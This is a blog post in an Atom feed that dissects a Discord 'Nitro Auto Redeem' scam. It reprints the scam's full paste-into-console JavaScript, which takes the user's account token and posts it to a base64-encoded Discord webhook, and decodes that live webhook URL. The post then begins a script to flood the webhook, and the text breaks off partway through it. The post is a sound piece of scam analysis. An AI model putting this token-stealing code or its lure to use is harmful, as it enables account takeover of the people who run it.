<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-07-02T05:11:27+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">JamBlog</title><subtitle>I'm Jamie, also known as JamBot! This is just where I'll document various impulsive ideas and projects of mine. I like computers and some other stuff :) 
</subtitle><author><name>JamBot</name></author><entry><title type="html">Discord scammer #1</title><link href="http://localhost:4000/blog/discord-scammer-1" rel="alternate" type="text/html" title="Discord scammer #1" /><published>2021-06-29T00:00:00+01:00</published><updated>2021-06-29T00:00:00+01:00</updated><id>http://localhost:4000/blog/discord-scammer1</id><content type="html" xml:base="http://localhost:4000/blog/discord-scammer-1">&lt;h1 id=&quot;explanation&quot;&gt;Explanation&lt;/h1&gt;

&lt;p&gt;So basically, I‚Äôm in a discord server in which I‚Äôm a helper for students doing GCSE computer science. In the channel people often talk off-topic about separate computer related stuff, such as projects they‚Äôre working on etc. (The reason this is called ‚Äú#1‚Äù is because I see this stuff happen faily often, so I thought I might like to document it üòÑ) I thought this would make for some funny blog content, as well as lead onto some talk regarding discord‚Äôs security&lt;/p&gt;

&lt;p&gt;One day, a person from the server sent this message:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/my-friend-got-sent-this.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;(&lt;em&gt;The discord theme being used in this image is &lt;a href=&quot;https://github.com/leeprky/Lode&quot;&gt;lode&lt;/a&gt;&lt;/em&gt;)&lt;/p&gt;

&lt;p&gt;The section at the top read:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;READ FIRST
Nitro Auto Redeem Method
Usage:
1. press ctrl + shit + i
2. press console
3. paste script
4. press enter
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now if this guy telling people to open up the console and paste in a script wasn‚Äôt suspicious enough, the obfuscated code definitely was.&lt;/p&gt;

&lt;h1 id=&quot;understanding-the-code&quot;&gt;Understanding the code&lt;/h1&gt;

&lt;p&gt;The javascript shown in the picture is the following:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;webpackJsonp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;extra_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},[&lt;/span&gt;        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;extra_id&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]]);&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hasOwnProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__esModule&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;getToken&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nitro&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;atob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;KipAZXZlcnlvbmUgbWFkZSBieSB3YXRlcioqIHwgICA=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;atob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODU5Mzk1NjQwMTk4NjkyODg0L3k1aWI1YTNkZFZxNHpORkJYUm84MG9Fd3pqajBhNVd0Wm5PTUxOaEFUX1gybHpROFdXOURZZWd1bFd4NHRYcGFMeVIy&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;application/json&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;nitro&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}),&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;atob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Q29uZ3JhdHMgeW91IGhhdmUgc3VjY2VzZnVsbHkgcmVkZWVtZWQgbml0cm8sIGl0IHdpbGwgYmUgb24geW91ciBhY2NvdW50IHdpdGhpbiBvbmUgd2Vlay4gTm90ZTogeW91ciBhY2NvdW50IG11c3QgYmUgb3ZlciA0IG1vbnRocyBvbGQgYW5kIGFjdGl2ZS4gUHJvdmlkZWQgYnkgV2F0ZXI=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first thing I noticed reading this was that there was a post request being sent, as seen here:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;atob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODU5Mzk1NjQwMTk4NjkyODg0L3k1aWI1YTNkZFZxNHpORkJYUm84MG9Fd3pqajBhNVd0Wm5PTUxOaEFUX1gybHpROFdXOURZZWd1bFd4NHRYcGFMeVIy&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;application/json&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;nitro&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}),&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From my experience with javascript I knew that the syntax of a fetch request requires the url to be the first argument. Except here, the scammer had put&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODU5Mzk1NjQwMTk4NjkyODg0L3k1aWI1YTNkZFZxNHpORkJYUm84MG9Fd3pqajBhNVd0Wm5PTUxOaEFUX1gybHpROFdXOURZZWd1bFd4NHRYcGFMeVIy')&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;I wasn‚Äôt sure what this &lt;code class=&quot;highlighter-rouge&quot;&gt;atob()&lt;/code&gt; function was but I recognised that there was some base64 encoded text inside of it, so I simply googled and got what I expected&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/atob-javascript.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;It decodes a base64 string. So I decoded the string to find the url and found the following:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:~/Desktop/projects/blog/reverse_engineer_blog/jamblog]
‚îî‚îÄ‚ïº &amp;gt;  echo aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODU5Mzk1NjQwMTk4NjkyODg0L3k1aWI1YTNkZFZxNHpORkJYUm84MG9Fd3pqajBhNVd0Wm5PTUxOaEFUX1gybHpROFdXOURZZWd1bFd4NHRYcGFMeVIy |base64 -d
https://discord.com/api/webhooks/859395640198692884/y5ib5a3ddVq4zNFBXRo80oEwzjj0a5WtZnOMLNhAT_X2lzQ8WW9DYegulWx4tXpaLyR2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The link turned out to be a discord web hook. I actually got really excited at this point because I realized what was happening. What the scammer had done was setup was a server with a webhook in. Then they made it so that people‚Äôs tokens would be sent to the server. This meant I had a way to ruin the scam and potentially find out more information about the scammers.&lt;/p&gt;

&lt;p&gt;First I wanted to find out exactly what was being sent to the server. So I ran only the following piece of JS in my console:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;webpackJsonp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;extra_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},[&lt;/span&gt;        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;extra_id&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]]);&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hasOwnProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__esModule&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;getToken&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nitro&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;atob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;KipAZXZlcnlvbmUgbWFkZSBieSB3YXRlcioqIHwgICA=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I printed out the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;nitro&lt;/code&gt;. Which gave me the following:&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;**@everyone made by water** |   my_token&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;(&lt;em&gt;obviously im not posting my token on the internet lol&lt;/em&gt;)&lt;/p&gt;

&lt;p&gt;So now that we know what messages are being sent to the server, we can send our own messages :)))&lt;/p&gt;

&lt;h1 id=&quot;ruining-the-scam&quot;&gt;Ruining the scam&lt;/h1&gt;

&lt;p&gt;I found a &lt;a href=&quot;https://pypi.org/project/discord-webhook/&quot;&gt;python library&lt;/a&gt; that proved to be useful when making the following script:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;discord_webhook&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DiscordWebhook&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://discord.com/api/webhooks/859395640198692884/y5ib5a3ddVq4zNFBXRo80oEwzjj0a5WtZnOMLNhAT_X2lzQ8WW9DYegulWx4tXpaLyR2&quot;&lt;/span&gt;

